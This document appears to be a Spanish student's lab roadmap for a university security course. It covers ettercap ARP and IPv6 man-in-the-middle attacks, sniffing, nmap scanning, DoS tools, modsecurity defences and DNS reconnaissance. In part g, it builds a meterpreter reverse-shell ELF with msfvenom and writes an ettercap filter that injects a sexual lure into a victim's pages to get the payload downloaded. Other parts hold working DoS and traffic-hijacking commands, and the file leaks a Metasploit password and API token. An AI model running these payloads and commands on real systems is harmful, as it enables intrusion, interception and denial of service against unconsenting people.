
                                                         PRACTICA 2 DE LEGISLACIÓN Y SEGURIDAD INFORMÁTICA. HOJA DE RUTA.   
                                                         
                                                         
                                                         
                                                         
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
DATO IMPORTANTE: SI EL SNIFFING ES CORRECTO, AL HACER ARP -A LA MAC DEL ROUTER DEBE SER LA DE MI MAQUINA.                                                         
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
a) Instale el ettercap y pruebe sus opciones básicas en línea de comando.
   
  -> INSTALAR: apt update
               apt-get install ettercap-common (al no tener interfaz gráfica es la que tenemos que utilizar)
               sudo apt-get install wireshark (en tu maquina para poder visualizar el fichero de ettercap).
               
  -> LINK UTIL -> https://manpages.debian.org/testing/ettercap-common/ettercap.8.en.html  //https://www.irongeek.com/i.php?page=security/ettercapfilter
  
  -> para probar el comando: 
       ettercap -i ens33 -Tq -p -w [fichero donde se guarda] -M arp:remote /10.11.49.97// /10.11.48.1//
       scp lsi@10.11.49.98:[carpeta donde está el fichero] /home/miguimartinezzz/Documentos                      
       
   (opciones básicas están en man ettercap)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
b) Capture paquetería variada de su compañero de prácticas que incluya varias sesiones HTTP. 
   Sobre esta paquetería (puede utilizar el wireshark para los siguientes subapartados)
   
   ->realizamos sniffing en la interfaz ens33,text y quiet para que no salgan mil filas,en modo no promiscuo, que guarde la salida en ese fichero ,y realizar ataque MiTM enrte esas dos ip.
   -ettercap -i ens33 -Tq -p -w salidaEttercap -M arp:remote /10.11.49.97// /10.11.48.1// 
   -mi compañero hace peticiones http con wget 
   -ettercap -Tq -P repoison_arp  -w salidaEttercap   -M   arp:remote /10.11.49.97// /10.11.48.1//
   ->guardamos salida para poder abrirla con wireshark
   -scp lsi@10.11.49.98:salidaEttercap /home/miguimartinezzz/Documentos    
   -filtrar por tcp  y entrar en el paquete.  
• Identifique los campos de cabecera de un paquete TCP

   -CAMPOS CABECERA:
    ->Source Port: puerto de origen del paquete
    ->Destination Port: puerto de destino del paquete
    ->Sequence Number: numero de secuencia del primer byte del paquete
    ->ACK: posicion del byte mas alto recibido
    ->Header length: longitud de la cabecera
    ->Flags: Aparecen todas y si están activas o no
    ->Window: indica el tamaño de la ventana
    ->Checksum: verificación de integridad de cabecera y contenido
    ->Urgent Pointer: indica los datos que se deben entregar de manera más urgente posible.
    
• Filtre la captura para obtener el tráfico HTTP
  
  ->En Wireshark podemos aplicar filtros para conseguir los paquetes tcp dirigidos al puerto 80 (http) ,o filtrar por http directamente y conseguimos esos paquetes
  
• Obtenga los distintos “objetos” del tráfico HTTP (imágenes, pdfs, etc.)

  ->wget (link al recurso(no puede estar cifrado)) desde la máquina que está siendo sniffeada
  ->abrir con wireshark, darle a exportar objetos http y visualizar en la carpeta, aparecerán ahí.
  
• Visualice la paquetería TCP de una determinada sesión.
  
  ->filtrar por tcp -> ver (ampliar)
  
• Sobre el total de la paquetería obtenga estadísticas del tráfico por protocolo como fuente de información 
  para un análisis básico del tráfico.
  
  ->en wireshark existe la opcion de mostrar estadísticas.
  ->seleccionar protocol types/ipv4 y visualizar. (ampliar)
  
• Obtenga información del tráfico de las distintas “conversaciones” mantenidas.
  
  ->estadísticas/conversaciones -> especifica bytes enviados/recibidos, paquetes, puertos origen y destino, 
    tipo de paquetes, ips o macs origen y dest.
  
• Obtenga direcciones finales del tráfico de los distintos protocolos como
  mecanismo para determinar qué circula por nuestras redes.
  
  ->estadísticas -> direcciones resueltas (ampliar un poco)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
  
c) Obtenga la relación de las direcciones MAC de los equipos de su segmento.
   
   nast (sniffer -> dejo el link al manual que es bastante útil -> https://manpages.debian.org/bullseye/nast/nast.8.en.html)
   
   ejecutamos nast -m -> devuelve las mac de todos los equipos del segmento de red.
   nmap -sP -n  10.11.48.0/23
   
   ettercap:
    -ettercap -Tq (pulsa L al terminar)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
d) Obtenga la relación de las direcciones IPv6 de su segmento.
   
   ->Hacemos un ping a la multicast -> responden todos: ping -6 -I ens33 ff02::1
       Nota: debemos hacerlo a una interfaz física, de ahí que no nos sirva 6to4 ya que es lógica.
   
   ->ip -6 neigh: ->muestra las direcciones ipv6 fisicas que se comunicaron con nosotros al hacer el ping.
     Nota: si hacemos arp -a nos mostrará las ipv4 y sus mac.
   
   ->ettercap: -ettercap -Tq (pulsa 6 al terminar)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
e) Obtenga el tráfico de entrada y salida legítimo de su interface de red ens33 e investigue
   los servicios, conexiones y protocolos involucrados.
   
   ettercap -Tpq -i ens33 -w 

   O tcpdump -w apartadoE -i ens33

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
f) Mediante arpspoofing entre una máquina objetivo (víctima) y el router del laboratorio
   obtenga todas las URL HTTP visitadas por la víctima.
    
    nano /etc/ettercap/etter.conf:
        ec_gid = 0
        ec_uid = 0
         DESCOMENTAR TODAS LAS LINEAS DE REDIR COMMAND (IPV6 TB)
        remote_browser = "xdg-open http://%host%url"
   ->las url http aparecen filtrando por http, las https aparecen como comunicaciones DNS y el respectivo trafico TCP
       tenemos que mostrarlo por pantalla, cada vez que busques algo tiene que aparecer.
   ->ettercap -i ens33 -w salidaEttercap -P repoison_arp -P remote_browser -Tq -M arp:remote /10.11.49.97// /10.11.48.1//
   
   AL activar el plugin remote browser veremos por pantalla lo que la otra persona este viendo (siempre que se trate de tráfico HTTP,
      y hasta podremos interactuar con la la página nosotros, salir y si el otro busca otra cosa nos volverá a aparecer)
 
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
g) Instale metasploit. Haga un ejecutable que incluya un Reverse TCP meterpreter payload
   para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en
   ingeniería social para que una víctima u objetivo lo ejecute.
  
  
  INSTALACION:
     
     -curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
     -chmod +x msfinstall
     -./msfinstall
     (inicializamos base de datos) -> aparentemente como no root.
     -msfdb init
           :    MSF web service username: miguel
		MSF web service password: 2409
		MSF web service user API token: abb6dba9a7179c3843cab3b3a5ec356fe1c2e664eceaa2cb20cd4c0bbe134d85b598e0c9d5fb9358
		
     -msfconsole --version -> checkeamos version.  
  
  LANZAR MFSCONSOLE:
      
      -msfconsole
      (verificar conectividad)
      -db_status --token abb6dba9a7179c3843cab3b3a5ec356fe1c2e664eceaa2cb20cd4c0bbe134d85b598e0c9d5fb9358 --cert /home/lsi/.msf4/msf-ws-cert.pem --skip-verify https://localhost:5443
      
      ->Ejecutar msfconsole como usuario sin privilegios, si no no podemos interactuar con la BD.
      
  CREAR EL EJECUTABLE TCP_REVERSE METERPRETER PAYLOAD.
      -/opt/metasploit-framework/bin/msfvenom -l payloads | grep "linux/x64"
      ->escogemos el meterpreter_reverse_tcp
      -msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=10.11.49.98 lport=1234 -f elf -o evil_shell 
      (Le damos permisos)
      -chmod +x evil_shell
  
  PARA EJECUTAR LA POST-EXPLOTACION:
      
      -msfconsole
      -use exploit/multi/handler
      -set payload linux/x64/meterpreter_reverse_tcp
      -set lhost 10.11.49.98
      -set lport 1234
      -exploit
      
  PARA QUE EL COMPAÑERO SE DESCARGUE EL FILTRO: (esta todo en /home/lsi)
      
      -CREAMOS UN FILTRO y lo guardamos en html.filter:
      ` 
      if (ip.proto == TCP && tcp.dst == 80) {
	if (search(DATA.data, "Accept-Encoding")) {
		replace("Accept-Encoding", "Accept-Nothing!");
	}
	}
	if (ip.proto == TCP && tcp.src == 80) {
		if (search(DATA.data, "<title>")) {
			replace("</title>","</title><MUJER CALIENTE CERCA DE TI><h1>LINDA tiene ¡MUCHAS GANAS!
			de conocerte y ver todo de ti ;), te ha enviado un mensaje ,click aqui para abrirlo<h1><form method="get"
			action="http://10.11.49.98/evil_shell"><button type="submit">"DESCARGAR
			AHORA"</button></form>");
			msg("html injected");
		}
	}
	 
	`
	-lo guardamos como etterfilter:
	  etterfilter html.filter -o html.ef  
        
        -lo movemos a /ver/www/html:
          cp evil_shell /var/www/html

        -ettercap -i ens33 -Tq -P repoison_arp -p -F filter.ef -w salidaEttercap -M arp:remote /10.11.49.97// /10.11.48.1// 

  
  para probar que funciona hice un wget http://10.11.49.98/evil_shell y lo ejecute.
  PARA SABER QUE ESTA FUNCIONANDO:
     sysinfo
     shell 
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
h) Haga un MITM en IPv6 y visualice la paquetería.

   -IPV6 COMPAÑERO: 2002:a0b:3161::1
   ettercap -T -i ens33 -w salidaEttercap -M ARP /10.11.49.97/2002:a0b:3161::1// /10.11.48.1//
   ettercap -T -M ndp -i ens33 -w salidaEttercap /10.11.49.97// /10.11.48.1//

   -> Probamos a realizar ping6 y vemos que los paquetes se guardan. SI HACEMOS PING A MÁQUINA QUE ESTÁ SNIFFEANDO -> ERROR.
   
   UTILIZAR PARASITE6:
      
        apt install thc-ipv6
	atk6-alive6 ens33
	
	This is simple as it is. First turn on IPv6 forwarding and run parasite.

	Command: echo 1 > /proc/sys/net/ipv6/conf/all/forwarding
	Command: parasite6 eth0<replace with your interface> -l
	
	SPOOFEADO EJECUTA:
	ping6 ff02::1
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
i) Pruebe alguna herramienta y técnica de detección del sniffing (preferiblemente arpon).
     
     systemctl disable arpon
     
     nano /etc/arpon.conf

        mi ip y mac 
        ip gateway y mac
        
     systemctl start@ens33
   
     arpon -d -i ens33 -S

     y despues haces un arp -a y si la ip sigue siendo la del gateway -> FUNCIONA Y ERES FELIZ.
     
     
     ADVERTENCIA: MATA EL PROCESO Y DESHABILITA ANTES DE CERRAR SESION PORQUE SE TE CERRARA EL ORTO Y NO TE DEJARA ENTRAR.
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
j) Pruebe distintas técnicas de host discovey, port scanning y OS fingerprinting sobre las máquinas del laboratorio de prácticas en IPv4. 
   Realice alguna de las pruebas de port scanning sobre IPv6. ¿Coinciden los servicios prestados por un sistema con los de IPv4?.
   
   

	Host discovery:

	  nmap -sP 10.11.48.0/24  -> se lo hace a todas
	  nmap -SP 10.11.48.1-15  -> a las maquinas originales

	Port scanning:

	#nmap -sS 10.11.48.1-15

	OS fingerprinting:

	#nmap -O -sV 10.11.48.1-15
        
        #nmap -O --osscan-guess 10.11.49.97 //nmap -O --osscan-guess -fuzzy 10.11.49.97
        
        nmap -sV -6 2002:0a0b:3161::1
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
k) Obtenga información “en tiempo real” sobre las conexiones de su máquina, así como del ancho de banda consumido en cada una de ellas.

  ->iftop -i ens33
    
    La primera columna es la ip de origen desde la que se envían los paquetes.
    La segunda columna representa la dirección del tráfico. => significa saliente (subida), mientras
       que <= significa entrante (descarga).
    La tercera columna representa la ip de destino.
    Las últimas tres columnas representan el ancho de banda consumido de los últimos 2, 10 y 40
       segundos respectivamente.
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
l) PARA PLANTEAR DE FORMA TEÓRICA.: ¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas? 
 ¿Y mediante un DoS de tipo reflective flooding attack?.
    
    ->DIFERENCIA ENTRE DIRECT ATTACK Y REFLECTIVE(INDIRECT) ATTACK->
       
       -direct attack: la máquina atacante es la que realiza el DoS.
       -reflective: otras máquinas están realizando el DoS bajo ordenes de la atacante.
       
    -> DIRECT:
        Packit - Packet analysis and injection tool.
        Esta herramienta es útil ya que ,aparte de manipular y monitorizar tráfico IP,
          permite inyectar paquetes para poder realizar el denial of service.
          packit -t (protocolo que quieras) -c 0 -b 0 -i ens33 -d 10.11.49.97
           (podríamos especificar puertos e ips de origen)         
    
    ->REFLECTIVE: enviar mensaje a toda la red para que le envíen mensajes a una máquina específica y así se saturaría:
       packit -c 0 -b 0 -sR -d 10.11.49.97 -> así el source es random y a la máquina la podría estar atacando toda la red.
       -enviar paquetes a toda la red con destino .97 para que lo reenvien y saturar esa máquina.    
       
        
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
m) Ataque un servidor apache instalado en algunas de las máquinas del laboratorio de prácticas para tratar de provocarle una DoS. 
Utilice herramientas DoS que trabajen a nivel de aplicación (capa 7). ¿Cómo podría proteger dicho servicio ante este tipo de ataque? 
¿Y si se produjese desde fuera de su segmento de red? ¿Cómo podría tratar de saltarse dicha protección?

-INSTALAR SERVIDOR APACHE EN LA MAQUINA ATACANTE.
   -apt-get install apache2
   -systemctl enable apache2
   -systemctl start apache2
 
-INSTALAR SLOWHTTPTEST:
   -apt-get install slowhttptest

SLOWHTTPTEST -> 3 tipos de ataque:
      
        slowhttptest [-H|B|R|X] [-g] [-a range start] [-b range limit]
                  [-c number of connections]
                  [-d all traffic directed through HTTP proxy at host:port]
                  [-e probe traffic directed through HTTP proxy at host:port]
                  [-f value of Content-type header] [-i interval in seconds]
                  [-k request multiply factor] [-l test duration in seconds]
                  [-m value of Accept header]
                  [-n slow read interval in seconds]
                  [-o output file path and/or name]
                  [-p timeout for probe connection in seconds]
                  [-r connection per second]
                  [-s value of Content-Length header] [-t HTTP verb]
                  [-u absolute URL] [-v output verbosity level]
                  [-w advertised window size range start]
                  [-x max length of follow up data]
                  [-y advertised window size range end]
                  [-z slow read from receive buffer in bytes]

     
     -H      Starts slowhttptest in SlowLoris mode, sending unfinished HTTP
             requests.
             
             ->slowhttptest -c 8000 -H -r 200 -w 512 -y 1024 -n 5 -k 3 -u http://10.11.49.97 -p 3 

     -B      Starts slowhttptest in Slow POST mode, sending unfinished HTTP
             message bodies.
             
             ->slowhttptest -c 8000 -B -r 200 -w 512 -y 1024 -n 5 -k 3 -u http://10.11.49.97 -p 3 

     -X      Starts slowhttptest in Slow Read mode, reading HTTP responses
             slowly.   
                   
             ->slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://10.11.49.97 -p 3      
             
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
n) Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora?

-INSTALAR MODSECURITY EN LA MAQUINA QUE TIENE EL SERVIDOR:
   -apt install libapache2-mod-security2
   -systemctl restart apache2 
-CONFIGURAR DEFENSA SLOWLORIS Y HTTP POST:
    
    crear archivo modsecurity.conf y añadir:
    
     SecConnEngine On

     #Para ataques Slowloris
     SecReadStateLimit 50

     #Para ataques Slow http POST
     SecWriteStateLimit 50
     
-CONFIGURAR DEFENSA DE SLOW HTTP READ:
  ->nano apache2.conf
  -KeepAlive Off -> defiende slow read y slow head

(Keepalive si tarda en responder caga
SecReadStateLimit limita peticiones por usuario
SecwriteState lo mismo pero cndo esta en modo write )

-ACTIVAR Y DESACTIVAR MODSECURITY:
a2enmod security2
a2dismod security2        
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
o) Buscamos información.:
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
• Obtenga de forma pasiva el direccionamiento público IPv4 e IPv6 asignado a la Universidade da Coruña.
   -> host www.udc.es: nos dará ipv4 e ipv6 del host (si le haces ping no responde por el firewall).
   
• Obtenga información sobre el direccionamiento de los servidores DNS y MX
  de la Universidade da Coruña.
   
   INSTALAMOS EL PAQUETE DNSUTILS: apt-get install dnsutils
   ->PARA EL DNS REALIZAMOS LA SIGUIENTE CONSULTA:
       
       root@debian:/home/lsi# dig udc.es NS

; <<>> DiG 9.16.27-Debian <<>> udc.es NS
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 22855
;; flags: qr rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 9

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;udc.es.				IN	NS

;; ANSWER SECTION:
udc.es.			14400	IN	NS	chico.rediris.es.
udc.es.			14400	IN	NS	zape.udc.es.
udc.es.			14400	IN	NS	sun.rediris.es.
udc.es.			14400	IN	NS	zipi.udc.es.

;; ADDITIONAL SECTION:
chico.rediris.es.	1959	IN	A	162.219.54.2
chico.rediris.es.	78468	IN	AAAA	2620:10a:80eb::2
zape.udc.es.		8590	IN	A	193.144.52.2
zape.udc.es.		8590	IN	AAAA	2001:720:121c:e000::102
sun.rediris.es.		18531	IN	A	199.184.182.1
sun.rediris.es.		2878	IN	AAAA	2620:171:808::1
zipi.udc.es.		13340	IN	A	193.144.48.30
zipi.udc.es.		8590	IN	AAAA	2001:720:121c:e000::101
    
    ->PARA MX, LO MISMO PERO:
        
        root@debian:/home/lsi# dig udc.es MX // host -t MX udc.es

; <<>> DiG 9.16.27-Debian <<>> udc.es MX
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 50410
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;udc.es.				IN	MX

;; ANSWER SECTION:
udc.es.			987	IN	MX	10 udc-es.mail.protection.outlook.com.

;; ADDITIONAL SECTION:
udc-es.mail.protection.outlook.com. 10 IN A	104.47.11.74
udc-es.mail.protection.outlook.com. 10 IN A	104.47.11.202

;; Query time: 135 msec
;; SERVER: 10.8.12.49#53(10.8.12.49)
;; WHEN: Thu Oct 27 11:02:21 CEST 2022
;; MSG SIZE  rcvd: 117

• ¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC?.

     root@debian:/home/lsi# dig axfr udc.es @zipi.udc.es

; <<>> DiG 9.16.27-Debian <<>> axfr udc.es @zipi.udc.es
;; global options: +cmd
; Transfer failed.

     NO PODEMOS REALIZAR LA TRANSFERENCIA (PROBABLEMENTE RESTRINGE LAS IPS QUE PUEDEN ENVIAR PAQUETERIA AXFR).
     
  En caso negativo, obtenga todos los nombres.dominio posibles de la UDC.
      
      dnsrecon -d udc.es -r 193.144.48.1-193.144.63.254
      
      Este comando mostrará una salida con todos los nombres de dominio posibles.
      
• ¿Qué gestor de contenidos se utiliza en www.usc.es?

    HAY VARIAS OPCIONES: cmseek, whatweb....... (utilizaremos whatweb porque es la que vimos en clase de teoría)
    
    root@debian:/home/lsi# whatweb www.usc.es
http://www.usc.es [301 Moved Permanently] Apache[2.4.41], Country[UNITED STATES][US], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[52.157.220.132], RedirectLocation[https://www.usc.gal/], Title[301 Moved Permanently]
https://www.usc.gal/ [301 Moved Permanently] Apache, Content-Language[gl], Country[UNITED STATES][US], HTML5, HTTPServer[Apache], IP[52.157.220.132], Meta-Refresh-Redirect[https://www.usc.gal/gl], RedirectLocation[https://www.usc.gal/gl], Strict-Transport-Security[max-age=31536000; includeSubDomains; preload], Title[Redirecting to https://www.usc.gal/gl], UncommonHeaders[x-drupal-route-normalizer,x-content-type-options,permissions-policy], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]
https://www.usc.gal/gl [200 OK] Apache, Content-Language[gl], Country[UNITED STATES][US], HTML5, HTTPServer[Apache], IP[52.157.220.132], MetaGenerator[Drupal 9 (https://www.drupal.org)], Script[application/json], Strict-Transport-Security[max-age=31536000; includeSubDomains; preload], Title[Inicio | Universidade de Santiago de Compostela], UncommonHeaders[x-content-type-options,permissions-policy,link,x-dns-prefetch-control], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]

     COMO PODEMOS OBSERVAR, UTILIZAN DRUPAL 9.
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
p) Trate de sacar un perfil de los principales sistemas que conviven en su red de prácticas, puertos accesibles, fingerprinting, etc.
   
   realizaremos esto con nmap.
   `
   ->nmap -sS 10.11.48.0/24 // 10.11.49.0/24  //nmap -sS 10.11.48.1-15  -> Stealth Scan(SYN/TCP)
   ->nmap -sU 10.11.48.0/24 
   ->nmap -O --osscan-limit 10.11.49.97
   `
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
q) Realice algún ataque de “password guessing” contra su servidor ssh y compruebe que el analizador de logs reporta las correspondientes alarmas.
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
r) Reportar alarmas está muy bien, pero no estaría mejor un sistema activo, en lugar de uno pasivo. Configure algún sistema activo, por ejemplo OSSEC, y pruebe su
  funcionamiento ante un “password guessing”.
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ 
s) Supongamos que una máquina ha sido comprometida y disponemos de un fichero con sus mensajes de log. Procese dicho fichero con OSSEC para tratar de localizar evidencias
   de lo acontecido (“post mortem”). Muestre las alertas detectadas con su grado de criticidad, así como un resumen de las mismas.
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
   
   
   
   
